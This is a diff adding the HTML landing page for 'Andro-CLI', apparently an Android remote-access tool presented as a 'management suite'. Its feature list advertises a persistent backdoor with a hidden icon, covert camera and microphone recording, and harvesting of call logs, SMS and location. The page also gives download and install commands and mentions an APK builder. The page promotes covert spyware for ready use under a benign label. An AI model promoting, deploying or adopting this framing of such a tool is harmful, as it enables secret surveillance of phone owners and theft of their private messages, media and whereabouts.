@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Andro-CLI - Android Remote Management Suite</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="container">
+            <a href="index.html" class="logo">
+                <img src="https://github.com/AryanVBW/Andro-CLI/releases/download/Logos/Bgless2.png" alt="Andro-CLI Logo" height="40">
+            </a>
+            <div class="nav-links">
+                <a href="index.html" class="active">Home</a>
+                <a href="commands.html">Commands</a>
+                <a href="about.html">About</a>
+            </div>
+            <div class="mobile-menu">
+                <i class="fas fa-bars"></i>
+            </div>
+        </div>
+    </nav>
+
+    <header class="hero">
+        <div class="container">
+            <img src="https://github.com/AryanVBW/Andro-CLI/releases/download/Logos/Bgless2.png" alt="Andro-CLI Logo" height="120" class="hero-logo">
+            <h1><span class="terminal-cursor"></span></h1>
+            <p>A python based remote android management suite, powered by Python</p>
+            <div class="cta-buttons">
+                <a href="#installation" class="btn primary">Get Started</a>
+                <a href="commands.html" class="btn secondary">View Commands</a>
+            </div>
+        </div>
+    </header>
+
+    <section id="features" class="features">
+        <div class="container">
+            <h2>Key Features<span class="terminal-cursor"></span></h2>
+            <div class="feature-grid">
+                <div class="feature-card">
+                    <i class="fas fa-shield-alt"></i>
+                    <h3>Full Control</h3>
+                    <p>Full persistent backdoor with invisible icon on install</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-camera"></i>
+                    <h3>Media Control</h3>
+                    <p>Record audio, video, take pictures from both cameras</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-mobile-alt"></i>
+                    <h3>Device Info</h3>
+                    <p>Access call logs, SMS logs, location, and device details</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-clock"></i>
+                    <h3>24/7 Operation</h3>
+                    <p>Light weight APK runs continuously in background</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-power-off"></i>
+                    <h3>Auto Start</h3>
+                    <p>App starts automatically on device boot</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <h3>Location Tracking</h3>
+                    <p>Get current location and device network details</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="compatibility">
+        <div class="container">
+            <h2>Compatibility<span class="terminal-cursor"></span></h2>
+            <div class="compatibility-content">
+                <div class="compatibility-text">
+                    <p>Andro-CLI works on devices from Android 4.1 (Jelly Bean) to Android 9.0 (Oreo) (API 16 to API 28)</p>
+                    <p class="note">Note: Also works on Android 10 (Q) but some interpreter commands may be unstable.</p>
+                </div>
+                <div class="tech-stack">
+                    <div class="tech-item">
+                        <img src="public/python-logo-only.png" alt="Python" height="40">
+                        <span>Python 3</span>
+                    </div>
+                    <div class="tech-item">
+                        <img src="public/java.png" alt="Java" height="40">
+                        <span>Java</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="installation" class="installation">
+        <div class="container">
+            <h2>Installation<span class="terminal-cursor"></span></h2>
+            <div class="installation-steps">
+                <div class="step">
+                    <h3>1. Download and Extract</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <button class="copy-btn"><i class="fas fa-copy"></i></button>
+                        </div>
+                        <pre><code>wget https://github.com/AryanVBW/Andro-CLI/releases/download/ARDro2/androcli.zip && unzip androcli.zip
+cd androcli</code></pre>
+                    </div>
+                </div>
+                <div class="step">
+                    <h3>2. Install Dependencies</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <button class="copy-btn"><i class="fas fa-copy"></i></button>
+                        </div>
+                        <pre><code>pip install -r requirements.txt</code></pre>
+                    </div>
+                </div>
+                <div class="step">
+                    <h3>3. Using Virtual Environment (Recommended)</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <button class="copy-btn"><i class="fas fa-copy"></i></button>
+                        </div>
+                        <pre><code># Install virtualenv if not installed
+pip install virtualenv
+
+# Create a virtual environment
+python -m venv andro-env
+
+# Activate the virtual environment
+# On Windows
+andro-env\Scripts\activate
+# On macOS/Linux
+source andro-env/bin/activate</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="screenshots">
+        <div class="container">
+            <h2>Andro-CLI in Action<span class="terminal-cursor"></span></h2>
+            <div class="screenshot-grid">
+                <div class="screenshot-card">
+                    <img src="public/5.png" alt="Andro-CLI Screenshot" class="screenshot">
+                    <div class="screenshot-overlay">
+                        <h3>Main Interface</h3>
+                        <p>Powerful command-line interface for Android management</p>
+                    </div>
+                </div>
+                <div class="screenshot-card">
+                    <img src="public/1.png" alt="Interpreter Commands" class="screenshot">
+                    <div class="screenshot-overlay">
+                        <h3>Command Interpreter</h3>
+                        <p>Interactive shell with extensive command support</p>
+                    </div>
+                </div>
+                <div class="screenshot-card">
+                    <img src="public/6.jpg" alt="APK Generation" class="screenshot">
+                    <div class="screenshot-overlay">
+                        <h3>APK Builder</h3>
+                        <p>Custom APK generation with advanced options</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h3>Andro-CLI<span class="terminal-cursor"></span></h3>
+                    <p>A python based remote android management suite, powered by Python</p>
+                </div>
+                <div class="footer-section">
+                    <h3>Quick Links</h3>
+                    <ul>
+                        <li><a href="index.html">Home</a></li>
+                        <li><a href="commands.html">Commands</a></li>
+                        <li><a href="about.html">About</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h3>Connect</h3>
+                    <div class="social-links">
+                        <a href="https://github.com/AryanVBW/Andro-CLI"><i class="fab fa-github"></i></a>
+                        <a href="mailto:whiteDevilVBW@proton.me"><i class="fas fa-envelope"></i></a>
+                    </div>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>Made with ❤️ By <a href="mailto:whiteDevilVBW@proton.me">Aryan</a> | v1.1.2</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="js/script.js"></script>
+</body>
+</html> 
